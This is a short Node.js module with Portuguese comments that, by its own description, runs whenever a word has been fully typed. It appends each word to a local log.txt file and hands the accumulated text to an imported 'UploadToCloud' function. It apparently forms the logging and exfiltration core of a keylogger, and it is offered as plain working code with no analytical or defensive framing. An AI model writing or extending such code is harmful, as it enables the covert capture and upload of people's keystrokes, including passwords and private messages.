const fs = require('fs')
const path = require('path')
const StoreChunk = require('./UploadToCloud')

//Define o caminho do arquivo em que os logs são registrados
const pathOfLog = path.resolve(process.cwd(), 'log.txt')

//A ação que é acionada quando uma palavra é digitada por completo
let data = ''
async function Action(word) {
    /*
        Leio o que já tem no log e adiciono a palavra que está vindo como 
        parâmetro.
        Ele tenta ler o arquivo de log, se ele não conseguir é porque não achou,
        se isso acontecer ele cria um novo
    */

    try {
        data = fs.readFileSync(pathOfLog) + word
    } catch {
        fs.writeFileSync(pathOfLog, '')
    }

    fs.writeFileSync(pathOfLog, data)
    StoreChunk(data)

}

module.exports = Action